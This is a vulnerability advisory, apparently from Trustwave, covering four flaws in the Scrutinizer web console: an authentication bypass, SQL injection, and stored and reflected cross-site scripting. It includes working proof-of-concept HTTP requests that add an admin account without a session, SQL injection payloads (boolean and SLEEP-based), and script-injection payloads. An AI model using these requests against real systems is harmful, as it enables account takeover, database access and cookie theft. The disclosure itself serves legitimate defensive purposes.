Finding 1: HTTP Authentication Bypass Vulnerability
CVE: CVE-2012-1258

The Scrutinizer web console provides a form-based login facility, requiring
users to authenticate to gain access to further functionality. A tiered
user access model is also used, where administrative and standard users
have a different selection of permissible functions. Authentication and
authorization is controlled by the cookie-based session management system.
Although this is implemented in a standardized way, the session tokens are
not required to perform privileged functions, such as adding users.

Example:

This request will add a user named "trustwave" with the password of
"trustwave" to the administrative user group.

#Request
GET /cgi-bin/userprefs.cgi?newUser=trustwave&pwd=trustwave&selectedUserGroup=1&= HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 ( .NET CLR 3.5.30729)

Finding 2: SQL Injection
CVE: CVE-2012-1259

The Scrutinizer web console is prone to unauthenticated SQL Injection
attacks due to user input not being appropriately validated and passed
directly to the backend.  An attacker could exploit this vulnerability to
attempt to gain access to sensitive information within the database or to
perform other attacks on the system.

Example 1:

These requests/responses below show a blind SQL injection vector, where a
proof of concept is used to return a syntactically correct response from
the server (200 OK) followed by an incorrect one (500 Internal Server
Error).

#Request 1
GET /cgi-bin/scrut_fa_exclusions.cgi?name%3anew28%3a28=on&name%3anew7%3a7=on&name%3anew27%3a27=on&name%3anew13%3a13=on&standalone=&name%3anew5%3a5=on&name%3anew14%3a14=on&name%3anew9%3a9=on&user_id=&name%3anew23%3a23=on&name%3anew17%3a17=on&name%3anew11%3a11=on&name%3anew24%3a24=on&addip=')%20AND%20('a'='a&name%3anew18%3a18=on&name%3anew21%3a21=on&name%3anew19%3a19=on&name%3anew22%3a22=on&nbaupdate=1&name%3anew12%3a12=on&name%3anew25%3a25=on&name%3anew2%3a2=on&name%3anew1%3a1=on&name%3anew10%3a10=on&name%3anew15%3a15=on&name%3anew26%3a26=on&name%3anew4%3a4=on&name%3anew6%3a6=on HTTP/1.1

#Response 2

Example 2:

The "getPermissionsAndPreferences" variable within the following request is
also vulnerable to a blind time-based attack.  The example payload included
will result in the server taking a delay of approximately five seconds
before returning a response.

#Request
http://127.0.0.1/cgi-bin/login.cgi?getPermissionsAndPreferences=1%20AND%20SLEEP(5)&session_id=OyAOiECuFdtRbEBY&nocache=12_13_12_734

Example 3:

It should be noted that the other area referenced below returns SQL errors
when a comment character is introduced into the bolded parameters and may
therefore also indicate that they are vulnerable to SQL injection.  The
below request demonstrates this activity.

#Request
http://127.0.0.1/d4d/alarms.php?loadAlarms=1&user_id=1&step=10&page=0&search_str=test&column=msg&fa_algorithm=all&order=modified_ts


Finding 3: Persistent Cross-site Scripting
CVE: CVE-2012-1260

The Scrutinizer web console stores unmodified user-supplied parameters
within its database.  No input validation or character encoding is
performed, resulting in the possibility of client-supplied variables
forming aspects of page content in such a way as to affect the syntax of
the HTML content.

Example:

The below requests/response demonstrate how an attacker could use this to
implant arbitrary Javascript via the "newUser" parameter.

#Request 1
GET /cgi-bin/userprefs.cgi?newUser=%22%3E%3Cscript%3Ealert(1)%3C/script%3E&pwd=guest2&selectedUserGroup=1&= HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 ( .NET CLR 3.5.30729)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Proxy-Connection: keep-alive
Content-Length: 6

Accessing the "Admin" Panel using the below URL results in the stored
JavaScript executing in the browser. It is noted that due to the previous
flaw documented above this may also be executed unauthenticated and results
in the disclosure of all user group names and IDs, along with all usernames
and userids stored in the application. This is achieved via the following
URL:

#Request 2
http://127.0.0.1/cgi-bin/userprefs.cgi?menu=1&nocache=5_26_33_895

#Response 2
HTTP/1.1 200 OK
Date: Thu, 17 Nov 2011 10:40:34 GMT
Server: Apache
Vary: Accept-Encoding
Content-Type: text/html; charset=utf-8
Content-Length: 276

{"groups":[{"name":"<script>alert(2)</script>","id":"4"},{"name":"<script>alert(document.cookie)</script>","id":"3"},{"name":"Administrators","id":"1"},{"name":"Guests","id":"2"}],"users":[{"name":"\"><script>alert(1)</script>","user_id":"12"},{"name":"admin","user_id":"1"}]}


Finding 4: Reflected Cross-site Scripting
CVE: CVE-2012-1261

The Scrutinizer web console suffers from a Cross Site Scripting
vulnerability in the 'standalone' variable of the
'cgi-bin/scrut_fa_exclusions.cgi' page.  No input validation or character
encoding is performed, resulting in the possibility of client-supplied
variables forming aspects of page content in such a way as to affect the
syntax of the HTML content.

Example:

The below request demonstrates the reflective cross-site scripting
vulnerability by supplying arbitrary JavaScript to the standalone variable.

#Request
GET /cgi-bin/scrut_fa_exclusions.cgi?init=1&standalone="><script>alert('xss')</script> HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 ( .NET CLR 3.5.30729)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Proxy-Connection: keep-alive
Referer: http://127.0.0.1/cgi-bin/myview.cgi?init=1
Content-Length: 4

Note: Only one example of each vulnerability is provided but the problem is
categorized as "systemic" due to the potential to store or render script
code within multiple similar regions, such as in user group and alarm
areas, respectively.
